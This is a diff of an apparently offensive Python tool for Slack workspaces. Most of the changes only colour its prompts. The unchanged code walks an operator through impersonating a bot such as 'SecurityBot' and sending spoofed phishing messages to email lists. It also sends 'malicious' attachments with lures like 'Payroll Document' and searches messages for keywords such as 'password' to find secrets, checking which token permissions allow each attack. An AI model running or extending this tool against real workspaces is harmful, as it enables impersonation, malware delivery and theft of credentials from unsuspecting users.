@@ -88,18 +88,18 @@ botname,icon,message = '','',''
 def setupSpoofMessage():
     global botname,icon,message
     div()
-    botname = input('Type the name you\'d like to impersionate\nExample: SecurityBot\n')
+    botname = input(green+'Type the name you\'d like to impersionate\n'+blue+'Example: '+white+'SecurityBot\n'+white)
     div()
-    icon = input('Type the URL to an image you\'d like to use as your profile photo\n')
+    icon = input(green+'Type the URL to an image you\'d like to use as your profile photo\n'+white)
     div()
-    message = input('Type your slack message\nExample: You have been mentioned in <https://google.com|Doc-3972>\n')
+    message = input(green+'Type your slack message\n'+blue+'Example: '+white+'You have been mentioned in <https://google.com|Doc-3972>\n'+white)
     div()
-    print('Spoofed name is: ' + botname + '\n'
-          'Icon URL: ' + icon + '\n'
-          'Slack Message: ' + message + '\n'
+    print(blue+'Spoofed name is: ' + white+botname + '\n'+
+          blue+'Icon URL: ' + white+icon + '\n'+
+          blue+'Slack Message: ' + white+message + '\n'
         )
     div()
-    ready = input('Ready to send your message? y/n\n')
+    ready = input(red+'Ready to send your message? y/n\n'+white)
     if ready != 'y':
         exit()
     elif args.email_list != None:
@@ -112,13 +112,13 @@ def setupSpoofMessage():
 def setupMessage():
     global botname,icon,message
     div()
-    message = input('Type your slack message\nExample: You have been mentioned in <https://google.com|Doc-3972>\n')
+    message = input(green+'Type your slack message\n'+blue+'Example: '+white+'You have been mentioned in <https://google.com|Doc-3972>\n'+white)
     div()
     print(
-          'Slack Message: \n' + message 
+          blue+'Slack Message: \n' + white+message 
         )
     div()
-    ready = input('Ready to send your message? y/n\n')
+    ready = input(red+'Ready to send your message? y/n\n'+white)
     if ready != 'y':
         exit()
     elif args.email_list != None:
@@ -142,7 +142,7 @@ def sendMessageToList():
     for address in r.readlines():
         lookupByEmailList(address)
         sendMessage()
-        print("Sending Message to: " + address)
+        print(green+"Sending Message to: " + address)
     r.close()
 
 # Lookup slack userid for each email in list
@@ -156,16 +156,16 @@ file_title = ''
 def setupFileMessage():
     global message,file_title
     div()
-    message = input(green + 'Type the slack message to accompany your malicious file\nExample: Please take a look at this report asap!\n'+white)
+    message = input(green + 'Type the slack message to accompany your malicious file\n'+blue+'Example: '+white+'Please take a look at this report asap!\n'+white)
     div()
-    file_title=input(green + 'Type the title of your file\nExample: Payroll Document\n'+white)
+    file_title=input(green + 'Type the title of your file\n'+blue+'Example: '+white+'Payroll Document\n'+white)
     div()
     print(
           blue+'Slack Message: ' + white+message +'\n'+
           blue+'Title of file: ' + white+file_title
         )
     div()
-    ready = input(red + 'Ready to send your message? y/n\n')
+    ready = input(red + 'Ready to send your message? y/n\n'+white)
     if ready != 'y':
         exit()
     elif args.email_list != None:
@@ -179,7 +179,7 @@ def sendFileToList():
     for address in r.readlines():
         lookupByEmailList(address)
         sendFile()
-        print("Sending File to: " + address)
+        print(green+"Sending File to: " + address)
     r.close()
 
 def sendFile():
@@ -192,7 +192,7 @@ def sendFile():
 
 def keywordSearch():
     div()
-    keyword = input('Type the keyword you\'d like to search for.\nExample: password\n')
+    keyword = input(green+'Type the keyword you\'d like to search for.\n'+blue+'Example: '+white+'password\n'+white)
     div()
     search = t.search_messages(
     query = keyword,
@@ -208,51 +208,51 @@ def keywordSearch():
 if args.spoof == True:
     if 'chat:write.customize' not in perms:
         div()
-        print(Fore.RED + 'ERROR: Your provided token does not have the chat:write.customize permissions.',
+        print(red + 'ERROR: Your provided token does not have the chat:write.customize permissions.',
               'You can not send a spoofed message'
               )
         exit()
     if args.email == None and args.email_list == None:
         div()
-        print(Fore.RED + 'ERROR: -sP/--spoof requires --email or --email_list')
+        print(red + 'ERROR: -sP/--spoof requires --email or --email_list')
         exit()
     else:
         setupSpoofMessage()
 if args.message == True:
     if 'chat:write' not in perms:
         div()
-        print(Fore.RED + 'ERROR: Your provided token does not have the chat:write permissions.',
+        print(red + 'ERROR: Your provided token does not have the chat:write permissions.',
               'You can not send a spoofed message'
               )
         exit()
     if args.email == None and args.email_list == None:
         div()
-        print(Fore.RED + 'ERROR: -m/--message requires --email or --email_list')
+        print(red + 'ERROR: -m/--message requires --email or --email_list')
         exit()
     else:
         setupMessage()
 if args.attach == True:
     if 'files:write' not in perms:
         div()
-        print(Fore.RED + 'ERROR: Your provided token does not have the files:write permissions.',
+        print(red + 'ERROR: Your provided token does not have the files:write permissions.',
               'You can not send a malicious attachment'
               )
         exit()
     if args.email == None and args.email_list == None:
         div()
-        print(Fore.RED + 'ERROR: -a/--attach requires --email or --email_list')
+        print(red + 'ERROR: -a/--attach requires --email or --email_list')
         exit()
     if args.file == None:
         div()
-        print(Fore.RED + 'ERROR: -a/--attach requires -f/--file')
+        print(red + 'ERROR: -a/--attach requires -f/--file')
         exit()
     else:
         setupFileMessage()
 if args.search == True:
     if 'search:read' not in perms:
         div()
-        print(Fore.RED + 'ERROR: Your provided token does not have the search:read permissions.',
-              Fore.RED + 'You can not do a keyword search for secrets'
+        print(red + 'ERROR: Your provided token does not have the search:read permissions.',
+              red + 'You can not do a keyword search for secrets'
               )
         exit()
     else:
